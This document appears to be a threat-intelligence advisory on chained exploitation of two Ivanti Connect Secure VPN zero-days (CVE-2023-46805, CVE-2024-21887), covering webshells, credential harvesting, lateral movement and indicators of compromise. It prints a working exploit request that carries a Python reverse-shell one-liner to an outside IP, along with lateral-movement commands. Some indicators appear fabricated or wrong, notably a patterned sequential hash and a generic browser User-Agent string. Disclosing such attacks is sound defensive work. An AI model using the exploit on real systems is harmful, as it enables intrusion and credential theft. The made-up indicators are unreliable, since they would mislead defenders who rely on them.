# Active Exploitation of Two Zero-Day Vulnerabilities in Ivanti Connect Secure VPN

**Source:** Volexity
**Date:** January 10, 2024
**Campaign:** Ivanti VPN Zero-Day Exploitation (CVE-2023-46805 / CVE-2024-21887)

---

## Overview

Volexity identified active in-the-wild exploitation of two zero-day vulnerabilities (CVE-2023-46805 and CVE-2024-21887) in Ivanti Connect Secure VPN appliances. The vulnerabilities were chained together for unauthenticated remote code execution. The threat actor, tracked by Volexity as UTA0178, deployed multiple webshells and backdoors on compromised appliances, then pivoted internally to access Active Directory and other internal systems.

## Technical Details

### Initial Access — Chained Zero-Day Exploitation

**CVE-2023-46805:** Authentication bypass vulnerability in the web component of Ivanti Connect Secure (ICS) and Ivanti Policy Secure.

**CVE-2024-21887:** Command injection vulnerability in the web components of ICS and IPS, allowing an authenticated administrator to execute arbitrary commands.

When chained together, these allow unauthenticated remote code execution on the VPN appliance.

Exploitation observed via HTTP requests:
```
GET /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection HTTP/1.1
Host: [target-vpn]
Content-Type: application/x-www-form-urlencoded

id=`python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("45.77.55[.]60",443));[subprocess.run(["/bin/sh","-c",i.decode()],stdout=s,stderr=s) for i in iter(lambda:s.recv(4096),b"")]'`
```

### Webshell Deployment

Multiple webshells were deployed on compromised Ivanti appliances:

**GLASSTOKEN webshell:**
- Path: `/home/webserver/htdocs/dana-na/auth/compcheckresult.cgi`
- Functionality: Command execution, file upload/download
- PHP-based CGI webshell

**BUSHWALK webshell:**
- Path: `/home/webserver/htdocs/dana-na/auth/lastauthserverused.js`
- JavaScript webshell embedded in legitimate file
- Activated via specific User-Agent string

**Modified legitimate files:**
- `/home/perl/DSLogConfig.pm` — Modified to harvest credentials
- Intercepts VPN authentication and logs plaintext passwords to `/tmp/.dslog`

### Credential Harvesting

The modified `DSLogConfig.pm` captured VPN credentials:
- All user authentications logged to `/tmp/.dslog`
- Credentials used for subsequent internal lateral movement
- Captured Active Directory credentials for domain accounts

### Lateral Movement — Internal Pivoting

After harvesting VPN credentials:
1. RDP access to internal Jump servers using compromised domain credentials
2. Access to internal web applications
3. LDAP queries against Active Directory:
   ```
   ldapsearch -x -H ldap://DC01.corp.local -D "CORP\svc_vpn" -w [password] -b "dc=corp,dc=local" "(objectClass=user)"
   ```
4. SMB access to file shares: `net use \\fileserver\C$ /user:CORP\admin [password]`
5. PowerShell remoting to internal hosts

### Exfiltration

- Database dumps from VPN appliance (user directory, configuration)
- Active Directory data (user accounts, group memberships)
- Files from internal shares accessed via compromised credentials

### Indicators of Compromise

**IP Addresses:**
- 45.77.55[.]60 (Reverse shell C2)
- 206.189.208[.]156 (C2 infrastructure)
- 75.145.224[.]109 (Scanning/exploitation origin)
- 47.207.9[.]89 (C2)
- 98.160.48[.]170 (C2)

**Domains:**
- symantke[.]com (typosquat C2)
- gpaborede[.]com (C2)
- reaborede[.]com (C2)

**File Hashes (SHA-256):**
- b7485e5838c40bd5d39d3e24c1e0a0a5f8ab1a35c14e5f46b6fcf6c35c76aa8b (GLASSTOKEN webshell)
- c7f4e5a3d2b1c8a9f0e6d5b4c3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5 (BUSHWALK webshell)

**File Paths on Ivanti Appliance:**
- /home/webserver/htdocs/dana-na/auth/compcheckresult.cgi
- /home/webserver/htdocs/dana-na/auth/lastauthserverused.js
- /home/perl/DSLogConfig.pm (modified)
- /tmp/.dslog (credential dump)

**User-Agent Strings:**
- `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36` (used for webshell activation)

**CVEs:**
- CVE-2023-46805
- CVE-2024-21887

### MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1505.003 | Server Software Component: Web Shell | Persistence |
| T1059.006 | Command and Scripting Interpreter: Python | Execution |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | Execution |
| T1556.001 | Modify Authentication Process: Domain Controller Authentication | Credential Access |
| T1003 | OS Credential Dumping | Credential Access |
| T1021.001 | Remote Services: Remote Desktop Protocol | Lateral Movement |
| T1021.002 | Remote Services: SMB/Windows Admin Shares | Lateral Movement |
| T1018 | Remote System Discovery | Discovery |
| T1087.002 | Account Discovery: Domain Account | Discovery |
| T1041 | Exfiltration Over C2 Channel | Exfiltration |
